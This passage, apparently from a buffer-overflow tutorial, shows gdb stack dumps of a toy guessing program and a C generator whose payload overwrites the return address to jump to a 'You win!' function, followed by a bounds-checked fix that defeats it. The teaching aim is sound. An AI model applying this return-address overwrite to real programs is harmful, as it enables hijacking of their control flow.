0x0804859f <+29>:    movl   $0x804871c,(%esp)\n\n   0x080485a6 <+36>:    call   0x80483e0 <scanf@plt>\n```", "```\n(gdb) x /64bx $esp\n```", "```\n0xffffd3f0:     0x1c    0x87    0x04    0x08    0x0c    0xd4    0xff    0xff\n\n0xffffd3f8:     0x00    0xa0    0x04    0x08    0xb2    0x86    0x04    0x08\n\n0xffffd400:     0x01    0x00    0x00    0x00    0xc4    0xd4    0xff    0xff\n\n0xffffd408:     0xcc    0xd4    0xff    0xff    0x31    0x32    0x33    0x34\n\n0xffffd410:     0x35    0x36    0x37    0x38    0x00    0x80    0x00    0x00\n\n0xffffd418:     0x6b    0x86    0x04    0x08    0x00    0x80    0xfb    0xf7\n\n0xffffd420:     0x60    0x86    0x04    0x08    0x00    0x00    0x00    0x00\n\n0xffffd428:     0x00    0x00    0x00    0x00    0x43    0x5a    0xe1    0xf7\n```", "```\n0xffffd408:     0xcc    0xd4    0xff    0xff    0x31    0x32    0x33    0x34\n\n0xffffd410:     0x35    0x36    0x37    0x38    0x00    0x80    0x00    0x00\n```", "```\n$ ./secret\n\nEnter secret number:\n\n12345678\n\nYou are so wrong!\n\n$ echo $?\n\n1\n```", "```\n$ ./secret\n\nEnter secret number:\n\n1234567890123456789012345678901234\n\nYou are so wrong!\n\nSegmentation fault (core dumped)\n\n$ echo $?\n\n139\n```", "```\n$ gdb secret\n\n(gdb) break *0x804859b\n\n(gdb) ni\n\n(gdb) run < input.txt\n\n(gdb) x /64bx $esp\n\n0xffffd3f0:     0x1c    0x87    0x04    0x08    0x0c    0xd4    0xff    0xff\n\n0xffffd3f8:     0x00    0xa0    0x04    0x08    0xb2    0x86    0x04    0x08\n\n0xffffd400:     0x01    0x00    0x00    0x00    0xc4    0xd4    0xff    0xff\n\n0xffffd408:     0xcc    0xd4    0xff    0xff    0x31    0x32    0x33    0x34\n\n0xffffd410:     0x35    0x36    0x37    0x38    0x39    0x30    0x31    0x32\n\n0xffffd418:     0x33    0x34    0x35    0x36    0x37    0x38    0x39    0x30\n\n0xffffd420:     0x31    0x32    0x33    0x34    0x35    0x36    0x37    0x38\n\n0xffffd428:     0x39    0x30    0x31    0x32    0x33    0x34    0x00    0xf7\n```", "```\n$ gdb secret\n\n(gdb) disas endGame\n\nDump of assembler code for function endGame:\n\n   0x08048564 <+0>:     push   %ebp\n\n   0x08048565 <+1>:     mov    %esp,%ebp\n\n   0x08048567 <+3>:     sub    $0x18,%esp\n\n   0x0804856a <+6>:     movl   $0x80486fe,(%esp)\n\n   0x08048571 <+13>:    call   0x8048390 <puts@plt>\n\n   0x08048576 <+18>:    movl   $0x0,(%esp)\n\n   0x0804857d <+25>:    call   0x80483b0 <exit@plt>\n\nEnd of assembler dump.\n```", "```\n#include <stdio.h>\n\nchar ebuff[]=\n\n\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x30\" /*first 10 bytes of junk*/\n\n\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x30\" /*next 10 bytes of junk*/\n\n\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x30\" /*following 10 bytes of junk*/\n\n\"\\x31\\x32\" /*last 2 bytes of junk*/\n\n\"\\x64\\x85\\x04\\x08\" /*address of endGame (little endian)*/\n\n;\n\nint main(void) {\n\n    int i;\n\n    for (i = 0; i < sizeof(ebuff); i++) { /*print each character*/\n\n        printf(\"%c\", ebuff[i]);\n\n    }\n\n return 0;\n\n}\n```", "```\n$ gcc -o genEx genEx.c\n\n$ ./genEx > exploit\n```", "```\n$ ./secret < exploit\n\nEnter secret number:\n\nYou are so wrong!\n\nYou win!\n```", "```\n$ echo $?\n\n0\n```", "```\n#include <stdio.h>\n\n#include <stdlib.h>\n\n#include \"other.h\" //contain secret function definitions\n\n /*prints out the You Win! message*/\n\nvoid endGame(void) {\n\n    printf(\"You win!\\n\");\n\n    exit(0);\n\n}\n\n/*main function of the game*/\n\nint main() {\n\n    int guess, secret, len;\n\n    char buf[12]; //buffer (12 bytes long)\n\n    printf(\"Enter secret number:\\n\");\n\n    scanf(\"%12s\", buf); //read guess from user input (fixed!)\n\n    guess = atoi(buf); //convert to an integer\n\n    secret=getSecretCode(); //call the getSecretCode function\n\n    //check to see if guess is correct\n\n    if (guess == secret) {\n\n        printf(\"You got it right!\\n\");\n\n    }\n\n    else {\n\n        printf(\"You are so wrong!\\n\");\n\n        return 1; //if incorrect, exit\n\n    }\n\n    printf(\"Enter the secret string to win:\\n\");\n\n    scanf(\"%12s\", buf); //get secret string from user input (fixed!)\n\n    guess = calculateValue(buf, strlen(buf)); //call calculateValue function\n\n    //check to see if guess is correct\n\n    if (guess != secret) {\n\n        printf(\"You lose!\\n\");\n\n        return 2; //if guess is wrong, exit\n\n    }\n\n    /*if both the secret string and number are correct\n\n    call endGame()*/\n\n    endGame();\n\n    return 0;\n\n}\n```", "```\n$ ./secret2 < exploit\n\nEnter secret number:\n\nYou are so wrong!\n\n$ echo $?\n\n1\n```"]